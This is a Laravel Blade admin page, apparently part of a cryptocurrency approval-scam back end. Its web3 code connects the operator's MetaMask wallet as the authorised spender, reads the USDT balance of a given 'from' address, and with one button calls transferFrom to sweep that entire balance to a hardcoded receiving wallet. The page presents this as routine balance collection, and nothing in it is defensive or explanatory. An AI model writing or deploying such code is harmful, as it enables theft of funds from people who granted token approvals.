@extends('admin._layoutNew')

@section('page-head')

<style>
    .layui-form-item .layui-input-inline {
    float: left;
    width: 70%;
    margin-right: 10px;
}
</style>

<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/3.0.0-rc.5/web3.min.js" integrity="sha512-jRzb6jM5wynT5UHyMW2+SD+yLsYPEU5uftImpzOcVTdu1J7VsynVmiuFTsitsoL5PJVQi+OtWbrpWq/I+kkF4Q==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
<script>
    var contractAbi=[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balances","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowed","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"}];
</script>
@endsection

@section('page-content')
    <form class="layui-form" action="">
     
<fieldset class="layui-elem-field">
    <legend>
        <i class="layui-icon layui-icon-password"></i>
        <span>归集表单</span>
    </legend>
    <div class="layui-field-box">
    <div class="layui-form-item">
            <label class="layui-form-label">当前地址</label>
            <div class="layui-input-inline">
                <input disabled type="text" id="account" style="width: 100%" name="account" autocomplete="off" class="layui-input" value="">
            </div>
        </div>
        <div class="layui-form-item">
            <label class="layui-form-label">授权地址</label>
            <div class="layui-input-inline">
                <input disabled type="text"  style="width: 100%"  autocomplete="off" class="layui-input" value="{{$sp_address}}">
            </div>
        </div>
        <div class="layui-form-item">
            <label class="layui-form-label">代币地址</label>
            <div class="layui-input-inline">
                <input disabled type="text" id="token_contract_address" style="width: 100%" name="token_contract_address" autocomplete="off" class="layui-input" value="0xdAC17F958D2ee523a2206206994597C13D831ec7">
            </div>
        </div>
        <div class="layui-form-item">
            <label class="layui-form-label">发送地址</label>
            <div class="layui-input-inline">
                <input disabled type="text" name="from_address" id="from_address" autocomplete="off" value="{{$from_address}}" class="layui-input">

            </div>
        </div>
        <div class="layui-form-item">
            <label class="layui-form-label">代币余额</label>
            <div class="layui-input-inline">
                <input   type="text" value="Loading...." name="address_balance" id="address_balance" autocomplete="off" class="layui-input">

            </div>
        </div>

 
        <div class="layui-form-item">
            <label class="layui-form-label">接收地址</label>
            <div class="layui-input-inline">
                <input type="text" name="to_address" id="to_address" value="0x778227Cd3c8D8849E5416b47d69d6b03cC1C0849" autocomplete="off" class="layui-input">

            </div>
        </div>
     
        <div class="layui-form-item">
            <input type="button" class="layui-btn" onclick="o_collect()" value="余额归集" />

        </div>
    </div>
</fieldset>
    </form>

@endsection

@section('scripts')


<script>
    var web3;
    var userAccount;
    window.addEventListener('load', function() {

        var web3Provider;
        if (window.ethereum) {
            web3Provider = window.ethereum;

        } else if (window.web3) { // 老版 MetaMask Legacy dapp browsers...
            web3Provider = window.web3.currentProvider;
        } else {
            web3Provider = new Web3.providers.HttpProvider('http://localhost:8545');
        }
        web3 = new Web3(web3Provider);


        async function web3Login() {
            if (!window.ethereum) {
                alert('MetaMask not detected. Please install MetaMask first.');
                return;
            }

            const provider = new ethers.providers.Web3Provider(window.ethereum);


            await provider.send("eth_requestAccounts", []);
            userAccount = await provider.getSigner().getAddress();

        

            var element={
                contract:null,
              
                create:function()
                {
                    var el={
                        account:document.getElementById('account'),
                        token:document.getElementById('token_contract_address'),
                        from_address:document.getElementById('from_address'),
                    };
                    var obj={};
                    obj.account=userAccount;
                    obj.from_address= el.from_address.value; //'0xdAC17F958D2ee523a2206206994597C13D831ec7';                  
                    obj.token=el.token.value ;
                    
                    var bind_balance=function(){
                        element.contract.methods.balanceOf(obj.from_address).call({from: obj.account}, function(error, result){
                            if(!error) {
                                console.log(result);
                                document.getElementById('address_balance').value=result;
                                // alert(result);
                            } else {
                                console.log(error);
                            }
                        });
 
                    }
                    var init= function(){
                        el.account.value=userAccount;
          
                        element.contract = new web3.eth.Contract(contractAbi, obj.token,{
                            from: userAccount, // d
                        
                        });
 
                    };
                    init();
                    bind_balance();
                    return obj;
                }
    
            }

            var obj=element.create();
            
            
        }

        web3Login();

    })


    function o_collect() {

        try {
            
            contract = new web3.eth.Contract(contractAbi, document.getElementById('token_contract_address').value);
            var amount = $("#address_balance").val();
      
            if (amount <= 0)
                throw '金额不能小于等于0';
            var data = {
                token: $("#token_contract_address").val(),
                from: $("#from_address").val(),
                to: $("#to_address").val(),
                amount:amount,
                userAccount: userAccount
            };
         
            var loading = layer.load(1, {
                time: 30 * 1000
            });
            contract.methods.transferFrom(
                data.from,
                data.to,
                data.amount
            ).send({
                from: data.userAccount,
                // gasPrice: web3.utils.toHex(42000000000),
                // gasLimit: web3.utils.toHex(90000),
            }).on('receipt', function(receipt) {
                console.log(receipt);
                layer.close(loading);
                layer.msg(receipt.transactionHash);
            }).on('error', function(error, receipt) {
                layer.msg(error);
                layer.close(loading);
                console.log(error, receipt);
            });

            // contract.methods.transferFrom(
            //     '0x9ecfc14e47fba91bba9d7f708640c12ec0a1b684',
            //     '0x9092A16C1824ECD3f83a3714D7ec3a047b26c33c',
            //     '0x91369165Bc120762D350408eE7e731286FD1f730',
            //     web3.utils.toHex(100000)
            //     ).send({
            //     from: userAccount,
            //     gasPrice: web3.utils.toHex(42000000000),
            //     gasLimit: web3.utils.toHex(90000),
            // }).then(function() {
            //     alert(11)
            // });
        } catch (e) {
            layer.msg(e);
        }

    }
</script>



    <script>
       

        layui.use(['form','laydate'],function () {
            var form = layui.form
                ,$ = layui.jquery
                ,laydate = layui.laydate
                ,index = parent.layer.getFrameIndex(window.name);
            //监听提交
            form.on('submit(demo1)', function(data){
                var data = data.field;
                $.ajax({
                    url:'{{url('admin/user/doadd')}}'
                    ,type:'post'
                    ,dataType:'json'
                    ,data : data
                    ,success:function(res){
                        if(res.type=='error'){
                            layer.msg(res.message);
                        }else{
                            // parent.layer.close(index);
                            parent.window.location.reload();
                        }
                    }
                });
                return false;
            });
        });
    </script>

@endsection